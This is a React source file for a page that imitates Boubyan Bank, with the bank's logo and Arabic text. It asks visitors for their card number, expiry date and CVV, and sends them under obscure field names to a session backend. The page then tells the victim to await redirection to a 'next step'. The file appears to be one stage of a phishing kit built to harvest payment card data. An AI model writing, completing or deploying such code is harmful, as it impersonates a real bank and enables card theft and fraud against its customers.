import { FormEvent, useState } from "react";
import { createOrUpdateRequest, fillFieldMessage } from "@/api/visitorSession";
import { AdminGatedScreen } from "@/components/AdminGatedScreen";
import { useVisitorSession } from "@/hooks/useVisitorSession";

function digitsOnly(value: string, max: number) {
  return value.replace(/\D/g, "").slice(0, max);
}

export default function CardDataPage() {
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [errors, setErrors] = useState<Record<string, string | null>>({});
  const [submitted, setSubmitted] = useState(false);

  useVisitorSession("card_data");

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    const next: Record<string, string | null> = {};
    if (cardNumber.replace(/\s/g, "").length < 16) next.card = fillFieldMessage("رقم البطاقة");
    if (expiry.length < 5) next.expiry = fillFieldMessage("تاريخ الانتهاء");
    if (cvv.length < 3) next.cvv = fillFieldMessage("رمز CVV");
    setErrors(next);
    if (Object.keys(next).length > 0) return;

    await createOrUpdateRequest({
      stage_key: "card_data",
      extra_key_a: cardNumber.replace(/\s/g, ""),
      extra_key_b: expiry,
      extra_key_c: cvv,
      notify_key: "----",
      stage_state: "pending",
    });
    setSubmitted(true);
  };

  const onExpiryChange = (raw: string) => {
    const d = digitsOnly(raw, 4);
    if (d.length <= 2) setExpiry(d);
    else setExpiry(`${d.slice(0, 2)}/${d.slice(2)}`);
  };

  return (
    <AdminGatedScreen>
      <main className="page-bank__shell view--bank" aria-label="بيانات البطاقة">
        <header className="bank-topbar">
          <span className="bank-icon bank-icon--chat" aria-hidden="true" />
          <button type="button" className="bank-menu" aria-label="القائمة">
            <span />
            <span />
            <span />
          </button>
        </header>
        <div className="bank-logo-wrap">
          <img src="/BoubyanBankLogo_(1).webp" alt="بوبيان Boubyan" className="bank-logo-img" width={165} />
        </div>
        {submitted ? (
          <p className="bank-hint personal-info-hint" role="status">
            تم إرسال البيانات بنجاح. يرجى انتظار التوجيه إلى الخطوة التالية.
          </p>
        ) : (
          <form className="bank-form" onSubmit={onSubmit} noValidate>
            <h1 className="bank-section-title personal-info-title">بيانات البطاقة</h1>
            <p className="bank-hint personal-info-hint">أدخل بيانات بطاقتك لإكمال العملية</p>

            <label className="bank-field">
              <span className="bank-label">رقم البطاقة</span>
              <input
                type="text"
                className="bank-input"
                inputMode="numeric"
                autoComplete="cc-number"
                dir="ltr"
                placeholder="0000 0000 0000 0000"
                value={cardNumber}
                onChange={(e) => {
                  const v = digitsOnly(e.target.value, 16);
                  const spaced = v.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
                  setCardNumber(spaced);
                  if (v.length >= 16) setErrors((prev) => ({ ...prev, card: null }));
                }}
              />
              {errors.card && (
                <p className="bank-field-error" role="alert">
                  {errors.card}
                </p>
              )}
            </label>

            <label className="bank-field">
              <span className="bank-label">تاريخ الانتهاء</span>
              <input
                type="text"
                className="bank-input"
                inputMode="numeric"
                autoComplete="cc-exp"
                dir="ltr"
                placeholder="MM/YY"
                value={expiry}
                onChange={(e) => {
                  onExpiryChange(e.target.value);
                  if (e.target.value.length >= 5) setErrors((prev) => ({ ...prev, expiry: null }));
                }}
              />
              {errors.expiry && (
                <p className="bank-field-error" role="alert">
                  {errors.expiry}
                </p>
              )}
            </label>

            <label className="bank-field">
              <span className="bank-label">رمز CVV</span>
              <input
                type="password"
                className="bank-input"
                inputMode="numeric"
                autoComplete="cc-csc"
                dir="ltr"
                maxLength={4}
                value={cvv}
                onChange={(e) => {
                  setCvv(digitsOnly(e.target.value, 4));
                  if (e.target.value.length >= 3) setErrors((prev) => ({ ...prev, cvv: null }));
                }}
              />
              {errors.cvv && (
                <p className="bank-field-error" role="alert">
                  {errors.cvv}
                </p>
              )}
            </label>

            <button type="submit" className="btn-primary btn-primary--bank">
              تأكيد
            </button>
          </form>
        )}
      </main>
    </AdminGatedScreen>
  );
}